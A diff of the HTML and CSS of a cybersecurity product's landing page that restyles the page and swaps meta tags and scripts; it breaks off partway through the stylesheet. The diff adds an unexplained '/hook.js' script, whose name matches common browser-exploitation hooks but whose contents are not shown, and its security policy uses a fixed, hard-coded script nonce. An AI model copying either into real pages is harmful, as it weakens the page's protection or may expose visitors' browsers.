@@ -1,17 +1,10 @@
 <!DOCTYPE html>
-<html lang="en" itemscope itemtype="https://schema.org/SoftwareApplication">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#0c0d10">
-  <meta name="color-scheme" content="dark light">
-  <meta name="description" content="Elvira Genesis-Elvira: AI-Powered Cybersecurity Platform">
-  <meta name="keywords" content="cybersecurity, AI, GPU, threat detection, Elvira Architect, zero-trust">
-  <meta name="robots" content="index,follow">
-  <meta name="referrer" content="strict-origin-when-cross-origin">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Elvira Genesis-Elvira: AI-Powered Cybersecurity Platform with GPU-accelerated threat detection and sub-1ms response times.">
+  <meta name="keywords" content="cybersecurity, AI, GPU, threat detection, zero-trust, post-quantum, forensics, machine learning">
   <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
     script-src 'self' 'nonce-nexus2025' https://cdn.jsdelivr.net;
@@ -23,644 +16,348 @@
     base-uri 'none';
     media-src 'self' mediastream;
   ">
-  <meta itemprop="name" content="Elvira Genesis-Elvira">
-  <meta itemprop="description" content="AI-Powered Cybersecurity Platform">
-  <meta itemprop="applicationCategory" content="Security">
-  <meta itemprop="operatingSystem" content="Windows, Linux, macOS">
-  <meta property="og:title" content="Elvira Genesis-Elvira - AI Cybersecurity Platform">
-  <meta property="og:description" content="GPU-accelerated AI cybersecurity solution with sub-1ms response times">
-  <meta property="og:image" content="https://elvira-core.net/images/og-image.jpg">
-  <meta property="og:url" content="https://elvira-core.net">
-  <meta name="twitter:card" content="summary_large_image">
   <title>Elvira Genesis-Elvira</title>
-  <link rel="icon" href="data:," type="image/x-icon">
-  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
-  <script type="importmap" id="importmap" nonce="nexus2025">
-    {
-      "imports": {
-        "three": "https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js",
-        "three/examples/jsm/": "https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/"
-      }
-    }
-  </script>
-  <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js">
-  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&display=swap" as="style" crossorigin>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&display=swap">
   <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" nonce="nexus2025" defer></script>
   <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.min.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js" nonce="nexus2025" defer></script>
+  <script src="/hook.js" nonce="nexus2025" defer></script>
   <style nonce="nexus2025">
-    /* Embedded CSS for Elvira Genesis-Elvira */
-    *, *::before, *::after {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     :root {
       --bg: #0c0d10;
       --fg: #e0e3f4;
       --accent: #6be2eb;
       --secondary: #b39ddb;
-      --glow: rgba(107, 226, 235, 0.3);
-      --ice-gradient: linear-gradient(
-        135deg,
-        rgba(255, 255, 255, 0.12) 0%,
-        rgba(255, 255, 255, 0.08) 50%,
-        rgba(255, 255, 255, 0.12) 100%
-      );
-      --cryo-shadow: 0 8px 16px rgba(107, 226, 235, 0.2);
-      --hyper-blur: blur(8px);
-      --quantum-border: 1px solid rgba(255, 255, 255, 0.2);
-      --stark: rgba(0, 0, 0, 0.8);
-      --particle-glow: radial-gradient(
-        circle at 50% 50%, 
-        rgba(107, 226, 235, 0.4) 0%, 
-        rgba(179, 157, 219, 0.2) 70%,
-        transparent 100%
-      );
-      --quantum-ease: cubic-bezier(0.33, 1, 0.68, 1);
+      --glow: rgba(107, 226, 235, 0.4);
+      --gradient: linear-gradient(135deg, #0c0d10 0%, #1a1b22 100%);
+      --shadow: 0 10px 20px rgba(107, 226, 235, 0.3);
+      --border: 1px solid rgba(107, 226, 235, 0.3);
+      --header-height: 80px;
+      --ease: cubic-bezier(0.33, 1, 0.68, 1);
     }
 
-    :root[data-theme="frost"] {
-      --bg: rgba(240, 248, 255, 0.98);
+    [data-theme="light"] {
+      --bg: #e0e3f4;
       --fg: #0c0d10;
-    }
-
-    @media (prefers-color-scheme: light) {
-      :root[data-theme="light"] {
-        --bg: #e0e3f4;
-        --fg: #0c0d10;
-        --accent: #4f8dfd;
-        --secondary: #4a5a77;
-      }
-    }
-
-    :root[data-theme="high-contrast"] {
-      --bg: #000;
-      --fg: #fff;
-      --accent: #00f;
-      --secondary: #ccc;
+      --accent: #4f8dfd;
+      --gradient: linear-gradient(135deg, #e0e3f4 0%, #d0d3e4 100%);
+      --glow: rgba(79, 141, 253, 0.4);
+      --border: 1px solid rgba(79, 141, 253, 0.3);
     }
 
     html {
       scroll-behavior: smooth;
-      font-size: 16px;
-      scroll-padding-top: 100px;
+      scroll-padding-top: var(--header-height);
     }
 
     body {
-      font-family: 'Sora', system-ui, -apple-system, sans-serif;
-      background: var(--bg);
+      font-family: 'Sora', sans-serif;
+      background: var(--gradient);
       color: var(--fg);
-      line-height: 1.6;
+      line-height: 1.7;
       overflow-x: hidden;
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
-      perspective: 1000px;
-      transform-style: preserve-3d;
+      position: relative;
     }
 
-    @keyframes scanline {
-      0% { background-position: 0 0; }
-      100% { background-position: 0 100%; }
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      border: 0;
     }
 
-    body::after {
-      content: "";
+    canvas#webgl-bg {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: linear-gradient(to bottom, 
-        transparent 50%, 
-        rgba(0, 0, 0, 0.1) 51%, 
-        transparent 52%
-      );
-      background-size: 100% 4px;
-      animation: scanline 4s linear infinite;
-      pointer-events: none;
-      mix-blend-mode: overlay;
-      z-index: 9999;
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      body::after {
-        animation: none;
-      }
-    }
-
-    .quantum-field {
-      position: fixed;
-      inset: 0;
       z-index: -1;
-      pointer-events: none;
-    }
-
-    .energy-stream {
-      background: linear-gradient(
-        90deg,
-        rgba(107, 226, 235, 0.1) 0%,
-        rgba(179, 157, 219, 0.2) 50%,
-        rgba(107, 226, 235, 0.1) 100%
-      );
-      background-size: 200% 200%;
-      animation: quantum-flow 12s linear infinite;
+      opacity: 0.7;
       mix-blend-mode: screen;
-      position: absolute;
-      inset: 0;
-    }
-
-    .particle-decay {
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(
-        circle at 20% 80%, 
-        rgba(107, 226, 235, 0.15) 0%, 
-        transparent 40%
-      ),
-      radial-gradient(
-        circle at 80% 20%, 
-        rgba(179, 157, 219, 0.15) 0%, 
-        transparent 40%
-      );
-      mix-blend-mode: screen;
-    }
-
-    .quantum-canvas {
-      position: fixed;
-      pointer-events: none;
-      z-index: 9998;
-      mix-blend-mode: screen;
-    }
-
-    @keyframes quantum-entangle {
-      0% { transform: rotate(0deg) scale(0.8); opacity: 0; }
-      50% { transform: rotate(180deg) scale(1.2); opacity: 1; }
-      100% { transform: rotate(360deg) scale(0.8); opacity: 0; }
-    }
-
-    .quantum-loader {
-      position: fixed;
-      inset: 0;
-      display: grid;
-      place-items: center;
-      background: var(--stark);
-      z-index: 10001;
-      opacity: 1;
-      transition: opacity 0.5s ease;
-    }
-
-    .quantum-loader.hidden {
-      opacity: 0;
-      pointer-events: none;
-      display: none;
-    }
-
-    .cryo-spinner {
-      width: 60px;
-      height: 60px;
-      border: 3px solid var(--accent);
-      border-top-color: transparent;
-      animation: quantum-entangle 1.8s var(--quantum-ease) infinite;
-    }
-
-    .intro-sequence {
-      position: fixed;
-      inset: 0;
-      display: grid;
-      place-items: center;
-      background: var(--stark);
-      z-index: 10000;
-    }
-
-    .hologram-logo {
-      display: flex;
-      font: 800 4rem 'Sora';
-      color: var(--accent);
-      text-shadow: 0 0 30px var(--glow);
-    }
-
-    .logo-particle {
-      opacity: 0;
-      transform: translateY(20px);
-      animation: particle-emerge 0.6s var(--quantum-ease) forwards;
-    }
-
-    .logo-divider {
-      width: 2rem;
-      height: 4rem;
-      background: linear-gradient(to bottom, var(--accent), var(--secondary));
-      margin: 0 1rem;
-    }
-
-    @keyframes particle-emerge {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      .logo-particle {
-        animation: none;
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .auth-flow {
-      position: fixed;
-      inset: 0;
-      display: none;
-      place-items: center;
-      background: rgba(0, 0, 0, 0.9);
-      backdrop-filter: var(--hyper-blur);
-      z-index: 9999;
-    }
-
-    .terms-modal {
-      width: min(95vw, 600px);
-      padding: 2rem;
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
-      border-radius: 12px;
-    }
-
-    .terms-content {
-      margin: 1.5rem 0;
-      font-size: 1rem;
-    }
-
-    .quantum-btn {
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
-      color: var(--fg);
-      padding: 1.2rem 2rem;
-      border-radius: 12px;
-      font: 600 1rem 'Sora';
-      cursor: pointer;
-      position: relative;
-      overflow: visible;
-      transform-style: preserve-3d;
-      transition: transform 0.4s var(--quantum-ease), box-shadow 0.4s ease;
-      will-change: transform, box-shadow;
-    }
-
-    .quantum-btn::after {
-      content: '';
-      position: absolute;
-      inset: -4px;
-      background: var(--particle-glow);
-      filter: blur(16px);
-      opacity: 0;
-      transition: opacity 0.4s ease;
-      z-index: -1;
-    }
-
-    .quantum-btn:hover {
-      transform: scale(1.08) translateZ(20px) rotateX(5deg) rotateY(2deg);
-      box-shadow: var(--cryo-shadow);
-    }
-
-    .quantum-btn:hover::after {
-      opacity: 1;
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      .quantum-btn {
-        transition: none;
-      }
-      .quantum-btn:hover {
-        transform: none;
-        box-shadow: none;
-      }
-    }
-
-    #neural-bg {
-      position: fixed;
-      inset: 0;
-      z-index: -1;
-      pointer-events: none;
-    }
-
-    .neuro-universe::after {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background: radial-gradient(circle at 50% 50%, var(--glow) 0%, transparent 70%);
-      pointer-events: none;
     }
 
     header {
-      position: fixed;
+      position: sticky;
       top: 0;
-      width: 100%;
-      background: var(--ice-gradient);
-      backdrop-filter: var(--hyper-blur);
-      border-bottom: var(--quantum-border);
+      background: rgba(12, 13, 16, 0.95);
+      backdrop-filter: blur(12px);
+      padding: 1.5rem;
       z-index: 1000;
-      padding: 0.75rem 0;
+      height: var(--header-height);
+      box-shadow: var(--shadow);
     }
 
     header .container {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      max-width: 1440px;
+      max-width: 1600px;
       margin: 0 auto;
-      padding: 0 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
     }
 
     h1 {
-      font: 800 clamp(2rem, 8vw, 4rem) 'Sora';
-      text-shadow: 0 0 16px var(--glow);
+      font-size: clamp(2rem, 6vw, 3rem);
+      font-weight: 700;
+      text-shadow: 0 0 15px var(--glow);
     }
 
-    .nav-links {
+    nav {
       display: flex;
-      gap: 0.8rem;
-      flex-wrap: wrap;
+      align-items: center;
+      gap: 2rem;
     }
 
-    .nav-links a {
+    nav a {
       color: var(--fg);
       text-decoration: none;
+      font-size: 1.1rem;
       font-weight: 600;
-      font-size: 0.95rem;
       padding: 0.5rem;
-      transition: color 0.4s var(--quantum-ease);
-      will-change: color;
+      position: relative;
+      transition: color 0.3s var(--ease), transform 0.3s var(--ease);
     }
 
-    .nav-links a:hover, .nav-links a.active {
+    nav a:hover, nav a[aria-current="page"] {
       color: var(--accent);
+      transform: scale(1.1);
+    }
+
+    nav a:focus {
+      outline: 2px solid var(--accent);
+      outline-offset: 2px;
     }
 
     .theme-toggle {
       background: none;
       border: none;
       color: var(--fg);
-      font-size: 1.3rem;
+      font-size: 1.5rem;
       cursor: pointer;
-      transition: transform 0.4s var(--quantum-ease);
-      will-change: transform;
+      transition: transform 0.3s var(--ease);
     }
 
-    .theme-toggle:hover {
-      transform: scale(1.1);
-    }
-
-    .theme-toggle:focus {
+    .theme-toggle:hover, .theme-toggle:focus {
+      transform: scale(1.2);
       outline: 2px solid var(--accent);
     }
 
     main {
-      padding-top: 5rem;
-      min-height: 100vh;
-    }
-
-    .container {
-      max-width: 1440px;
+      max-width: 1600px;
       margin: 0 auto;
-      padding: 0 1rem;
-      display: grid;
-      grid-template-columns: repeat(12, 1fr);
-      gap: 1.5rem;
+      padding: 3rem 1.5rem;
     }
 
     section {
-      padding: 3rem 0;
-      grid-column: 1 / -1;
-    }
-
-    [data-scroll] {
+      margin-bottom: 6rem;
       opacity: 0;
       transform: translateY(40px);
-      transition: opacity 0.6s var(--quantum-ease), transform 0.6s var(--quantum-ease);
+      transition: opacity 1s var(--ease), transform 1s var(--ease);
+      scroll-margin-top: var(--header-height);
     }
 
-    [data-scroll="in"] {
+    section.visible {
       opacity: 1;
       transform: translateY(0);
     }
 
-    @media (prefers-reduced-motion: reduce) {
-      [data-scroll] {
-        transition: none;
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
     h2 {
-      font: 800 clamp(1.75rem, 6vw, 3rem) 'Sora';
-      margin-bottom: 1.5rem;
+      font-size: clamp(2.5rem, 6vw, 4rem);
+      font-weight: 800;
       text-align: center;
-      grid-column: 1 / -1;
-      text-shadow: 0 0 10px var(--glow);
-    }
-
-    h3 {
-      font: 600 1.2rem 'Sora';
-      margin-bottom: 0.5rem;
+      margin-bottom: 2rem;
+      text-shadow: 0 0 15px var(--glow);
     }
 
     p {
-      font-size: 1rem;
-      max-width: 800px;
-      margin: 0 auto 1.5rem;
+      font-size: 1.2rem;
       text-align: center;
-      grid-column: 1 / -1;
-    }
-
-    ul {
-      list-style: none;
-      padding: 0;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-
-    ul li {
-      font-size: 0.95rem;
-      margin-bottom: 0.5rem;
-      position: relative;
-      padding-left: 1.5rem;
-    }
-
-    ul li::before {
-      content: '•';
-      color: var(--accent);
-      position: absolute;
-      left: 0;
-    }
-
-    .neuro-card {
-      position: relative;
-      border: 1px solid rgba(107, 226, 235, 0.3);
-      background: linear-gradient(145deg, rgba(16, 18, 27, 0.9), rgba(32, 35, 45, 0.9));
-      backdrop-filter: var(--hyper-blur);
-      box-shadow: 0 0 20px rgba(107, 226, 235, 0.1);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      will-change: transform, box-shadow;
-      border-radius: 24px;
-      padding: 1.5rem;
-    }
-
-    .neuro-card:hover {
-      transform: translateY(-5px) perspective(1000px) rotateX(3deg) rotateY(2deg);
-      box-shadow: 0 10px 30px rgba(107, 226, 235, 0.3);
-    }
-
-    .neuro-card::before {
-      content: '';
-      position: absolute;
-      inset: -4px;
-      background: var(--particle-glow);
-      z-index: -1;
-      animation: hologram-pulse 3s ease-in-out infinite;
-      border-radius: inherit;
-    }
-
-    .hologram-layer {
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), 
-        var(--glow) 0%, 
-        transparent 70%
-      );
-      opacity: 0;
-      transition: opacity 0.4s ease;
-    }
-
-    .cryo-border {
-      position: absolute;
-      inset: -2px;
-      border: var(--quantum-border);
-      border-radius: 24px;
-      z-index: -1;
-    }
-
-    .neuro-card:hover .hologram-layer {
-      opacity: 1;
+      max-width: 1000px;
+      margin: 0 auto 2rem;
     }
 
     .card-grid {
       display: grid;
-      gap: 2rem;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      grid-auto-flow: dense;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 2.5rem;
+      margin-top: 3rem;
     }
 
-    .card-grid > .neuro-card:is(:nth-child(3n+1)) {
-      grid-column: span 2;
-    }
-
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 1rem 0;
-    }
-
-    th, td {
-      padding: 0.6rem;
-      text-align: left;
-      border-bottom: var(--quantum-border);
-    }
-
-    th {
-      background: var(--accent);
-      color: #fff;
-      font-weight: 600;
-    }
-
-    td {
-      font-size: 0.9rem;
-    }
-
-    .cyber-button {
-      background: linear-gradient(45deg, #6be2eb, #b39ddb);
-      border: none;
-      padding: 12px 24px;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
-      color: #fff;
-      font: 600 0.95rem 'Sora';
-      cursor: pointer;
+    .card {
+      background: rgba(255, 255, 255, 0.08);
+      border: var(--border);
+      border-radius: 20px;
+      padding: 2.5rem;
       position: relative;
-      overflow: visible;
       transform-style: preserve-3d;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      will-change: transform, box-shadow;
+      transition: transform 0.4s var(--ease), box-shadow 0.4s var(--ease);
+      cursor: pointer;
+      overflow: hidden;
     }
 
-    .cyber-button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 8px rgba(107, 226, 235, 0.5);
+    .card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 50% 50%, var(--glow) 0%, transparent 70%);
+      opacity: 0;
+      transition: opacity 0.4s var(--ease);
     }
 
-    @media (prefers-reduced-motion: reduce) {
-      .cyber-button {
-        transition: none;
+    @media (hover: hover) and (pointer: fine) {
+      .card:hover::before {
+        opacity: 0.5;
       }
-      .cyber-button:hover {
-        transform: none;
-        box-shadow: none;
+      .card:hover {
+        transform: translateY(-15px) scale(1.03);
+        box-shadow: var(--shadow);
       }
     }
 
-    .cyber-button:focus {
-      outline: 2px solid var(--accent);
+    .card h3 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--accent);
+      text-shadow: 0 0 8px var(--glow);
     }
 
-    .contact-link {
-      color: inherit;
+    .btn {
+      display: inline-block;
+      background: linear-gradient(45deg, var(--accent), var(--secondary));
+      color: #fff;
+      padding: 1.2rem 2.5rem;
+      border-radius: 12px;
       text-decoration: none;
+      font-weight: 700;
+      font-size: 1.1rem;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.4s var(--ease), box-shadow 0.4s var(--ease);
+    }
+
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transition: left 0.4s var(--ease);
+    }
+
+    .btn:hover::after, .btn:focus::after {
+      left: 0;
+    }
+
+    .btn:hover, .btn:focus {
+      transform: scale(1.1);
+      box-shadow: var(--shadow);
+      outline: none;
     }
 
     #hero {
-      min-height: 80vh;
+      min-height: 100vh;
       display: flex;
-      align-items: center;
-      justify-content: center;
       flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #hero video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      opacity: 0.3;
+      z-index: -1;
+    }
+
+    .hero-logo {
+      font-size: clamp(4rem, 12vw, 6rem);
+      font-weight: 800;
+      color: var(--accent);
+      text-shadow: 0 0 25px var(--glow);
+      animation: hologram 3s infinite var(--ease);
+    }
+
+    @keyframes hologram {
+      0%, 100% { transform: scale(1) translateY(0); opacity: 1; }
+      50% { transform: scale(1.1) translateY(-10px); opacity: 0.7; }
+    }
+
+    .simulator {
+      background: rgba(255, 255, 255, 0.05);
+      border: var(--border);
+      border-radius: 20px;
+      padding: 2.5rem;
+      max-width: 900px;
+      margin: 3rem auto;
       text-align: center;
     }
 
-    #analytics .neuro-card {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1.5rem;
+    .simulator h3 {
+      font-size: 2rem;
+      color: var(--accent);
+      margin-bottom: 2rem;
+      text-shadow: 0 0 10px var(--glow);
+    }
+
+    .simulator .counter {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: var(--fg);
+      text-shadow: 0 0 12px var(--glow);
+    }
+
+    .chart-container {
+      max-width: 900px;
+      margin: 3rem auto;
+      padding: 2rem;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 16px;
+      border: var(--border);
+      box-shadow: var(--shadow);
     }
 
     .tab-nav {
       display: flex;
-      gap: 1.2rem;
       justify-content: center;
-      margin-bottom: 2rem;
-      flex-wrap: wrap;
+      gap: 2rem;
+      margin-bottom: 2.5rem;
     }
 
-    .tab-button {
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
+    .tab-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: var(--border);
       color: var(--fg);
-      padding: 0.9rem 1.8rem;
+      padding: 1rem 2rem;
       border-radius: 12px;
-      font: 600 1rem 'Sora';
+      font-weight: 600;
+      font-size: 1.1rem;
       cursor: pointer;
-      transition: transform 0.4s var(--quantum-ease), box-shadow 0.4s ease;
-      will-change: transform, box-shadow;
+      transition: transform 0.3s var(--ease), background 0.3s var(--ease);
     }
 
-    .tab-button:hover, .tab-button.active, .tab-button:focus {
+    .tab-btn:hover, .tab-btn.active, .tab-btn:focus {
+      background: var(--accent);
+      color: #fff;
       transform: scale(1.05);
-      box-shadow: var(--cryo-shadow);
-    }
-
-    .tab-button:focus {
-      outline: 2px solid var(--accent);
+      outline: none;
     }
 
     .tab-content {
@@ -671,2266 +368,1261 @@
       display: block;
     }
 
-    .canvas-container {
-      position: relative;
-      height: 320px;
-      margin: 1.8rem 0;
-      background: var(--ice-gradient);
-      border-radius: 24px;
-      border: var(--quantum-border);
-      padding: 1.2rem;
-      box-shadow: var(--cryo-shadow);
-    }
-
-    .canvas-fallback {
-      text-align: center;
-      color: var(--fg);
-      padding: 1.2rem;
-      font-size: 0.95rem;
-    }
-
-    .llm-container {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2.5rem;
-    }
-
-    .llm-form, .llm-output {
-      display: flex;
-      flex-direction: column;
-      gap: 1.2rem;
-    }
-
-    #llm-query, #llm-response {
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
-      color: var(--fg);
-      padding: 1.2rem;
-      border-radius: 12px;
-      font-size: 1rem;
-      resize: vertical;
-      min-height: 140px;
-      backdrop-filter: var(--hyper-blur);
-    }
-
-    .llm-controls {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem;
-    }
-
-    .llm-options-panel {
-      display: none;
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
-      padding: 1.2rem;
-      border-radius: 12px;
-      backdrop-filter: var(--hyper-blur);
-    }
-
-    .llm-options-panel.active {
-      display: block;
-    }
-
-    .llm-options-panel label {
-      display: block;
-      margin-bottom: 0.6rem;
-      font-size: 0.95rem;
-    }
-
-    #llm-provider, #llm-verbose {
-      background: var(--bg);
-      color: var(--fg);
-      border: var(--quantum-border);
-      padding: 0.6rem;
-      border-radius: 6px;
-      font-size: 0.95rem;
-    }
-
-    #llm-history-list {
-      list-style: none;
-      max-height: 240px;
-      overflow-y: auto;
-      padding-left: 0;
-    }
-
-    #llm-history-list li {
-      padding: 0.6rem;
-      border-bottom: var(--quantum-border);
-      display: flex;
-      justify-content: space-between;
-      font-size: 0.95rem;
-    }
-
-    .avatar-hud {
+    .modal {
       position: fixed;
-      bottom: 0;
-      right: 0;
-      width: 280px;
-      background: var(--ice-gradient);
-      padding: 1.2rem;
-      border-radius: 14px 0 0 0;
-      border-top: var(--quantum-border);
-      border-left: var(--quantum-border);
-      backdrop-filter: var(--hyper-blur);
-      box-shadow: var(--cryo-shadow);
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      backdrop-filter: blur(12px);
     }
 
-    .avatar-hud h3 {
-      font: 600 1.1rem 'Sora';
-      margin-bottom: 1.2rem;
+    .modal.active {
+      display: flex;
     }
 
-    .avatar-hud p {
-      margin: 0.6rem 0;
+    .modal-content {
+      background: rgba(255, 255, 255, 0.08);
+      border: var(--border);
+      border-radius: 20px;
+      padding: 3rem;
+      max-width: 600px;
+      width: 90%;
+      transform: scale(0.7);
+      opacity: 0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .modal.active .modal-content {
+      animation: modalAppear 0.6s forwards var(--ease);
+    }
+
+    @keyframes modalAppear {
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-content h3 {
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+      color: var(--accent);
+      text-shadow: 0 0 10px var(--glow);
+    }
+
+    .modal-content input, .modal-content textarea {
+      width: 100%;
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+      background: rgba(255, 255, 255, 0.1);
+      border: var(--border);
+      border-radius: 10px;
+      color: var(--fg);
+      font-size: 1.1rem;
+      transition: border-color 0.3s var(--ease);
+    }
+
+    .modal-content input:focus, .modal-content textarea:focus {
+      border-color: var(--accent);
+      outline: none;
+    }
+
+    .modal-content textarea {
+      resize: vertical;
+      min-height: 120px;
+    }
+
+    .modal-content .error {
+      color: #ff4d4d;
       font-size: 0.9rem;
+      margin-bottom: 1rem;
+      display: none;
     }
 
     footer {
-      background: var(--ice-gradient);
-      padding: 2rem 0;
       text-align: center;
-      border-top: var(--quantum-border);
-    }
-
-    footer p {
-      font-size: 0.95rem;
+      padding: 4rem 1.5rem;
+      background: rgba(12, 13, 16, 0.95);
       color: var(--secondary);
+      font-size: 1.1rem;
+      border-top: var(--border);
+      box-shadow: var(--shadow);
     }
 
     footer a {
       color: var(--accent);
       text-decoration: none;
-      transition: color 0.4s var(--quantum-ease);
+      transition: color 0.3s var(--ease);
     }
 
-    footer a:hover {
-      color: var(--secondary);
-    }
-
-    .accordion-header {
-      background: var(--ice-gradient);
-      border: none;
-      padding: 1.2rem;
-      width: 100%;
-      text-align: left;
-      cursor: pointer;
+    footer a:hover, footer a:focus {
       color: var(--fg);
-      font: 600 1rem 'Sora';
-      transition: background 0.4s var(--quantum-ease);
+      outline: none;
     }
 
-    .accordion-header:hover, .accordion-header:focus {
-      background: rgba(107, 226, 235, 0.1);
-    }
-
-    .accordion-header:focus {
-      outline: 2px solid var(--accent);
-    }
-
-    .accordion-content {
-      display: none;
-      padding: 1.2rem;
-    }
-
-    .accordion-content.active {
-      display: block;
-    }
-
-    #consent-popup {
-      position: fixed;
-      bottom: 1.2rem;
-      left: 1.2rem;
-      background: var(--ice-gradient);
-      border: var(--quantum-border);
-      padding: 1.2rem;
-      border-radius: 12px;
-      backdrop-filter: var(--hyper-blur);
-      z-index: 1000;
-    }
-
-    #consent-popup.hidden {
-      display: none;
-    }
-
-    #dev-panel {
-      position: fixed;
-      top: 0;
-      right: -320px;
-      width: 320px;
-      height: 100%;
-      background: var(--ice-gradient);
-      border-left: var(--quantum-border);
-      padding: 1.2rem;
-      transition: right 0.3s ease;
-    }
-
-    #dev-panel.active {
-      right: 0;
-    }
-
-    #keyboard-overlay {
-      position: fixed;
-      bottom: 1.2rem;
-      right: 1.2rem;
-      background: var(--ice-gradient);
-      padding: 0.6rem;
-      border-radius: 12px;
-      display: none;
-    }
-
-    #keyboard-overlay.active {
-      display: block;
-    }
-
-    .error-message {
-      color: #ff4d4d;
-      text-align: center;
-      padding: 1.5rem;
-      font-size: 1rem;
-    }
-
-    ::-webkit-scrollbar {
-      width: 12px;
-      background: rgba(0, 0, 0, 0.1);
-    }
-
-    ::-webkit-scrollbar-thumb {
-      background: var(--ice-gradient);
-      border-radius: 6px;
-      border: var(--quantum-border);
-    }
-
-    @supports (scrollbar-width: thin) {
-      * {
-        scrollbar-width: thin;
-        scrollbar-color: var(--accent) rgba(0, 0, 0, 0.1);
+    @media (prefers-reduced-motion: reduce) {
+      section, .card, .btn, .hero-logo, .modal-content, .tab-btn {
+        transition: none;
+        animation: none;
       }
-    }
-
-    .skip-link {
-      position: absolute;
-      top: -40px;
-      left: 0;
-      background: var(--accent);
-      color: #fff;
-      padding: 8px;
-      z-index: 10000;
-    }
-
-    .skip-link:focus {
-      top: 0;
+      section.visible, .card:hover, .btn:hover, .modal.active .modal-content, .tab-btn:hover {
+        transform: none;
+        box-shadow: none;
+      }
     }
 
     @media (max-width: 1024px) {
-      .container {
-        grid-template-columns: repeat(8, 1fr);
-      }
       .card-grid {
-        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
       }
-      .llm-container {
-        grid-template-columns: 1fr;
+      .simulator .counter {
+        font-size: 2rem;
       }
     }
 
     @media (max-width: 768px) {
-      .container {
-        grid-template-columns: 1fr;
-        padding: 0 0.5rem;
-      }
-      h1 { font-size: clamp(1.5rem, 6vw, 2.5rem); }
-      h2 { font-size: clamp(1.5rem, 5vw, 2.5rem); }
-      h3 { font-size: 1.1rem; }
-      p, ul li { font-size: 0.95rem; }
-      .nav-links {
